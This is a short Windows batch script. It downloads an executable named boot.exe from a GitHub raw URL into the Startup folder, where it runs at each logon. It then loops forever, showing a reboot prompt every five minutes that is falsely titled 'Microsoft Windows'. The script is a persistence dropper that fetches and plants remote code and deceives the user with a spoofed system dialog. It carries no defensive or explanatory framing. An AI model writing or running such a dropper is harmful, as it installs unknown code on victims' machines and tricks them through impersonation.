@echo off
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe
:rebootpls
timeout 300
nircmd.exe qboxcom "Do you want to reboot? Make sure you save everything you have open. (This prompt will disappear after reboot.)" "Microsoft Windows" exitwin reboot
goto rebootpls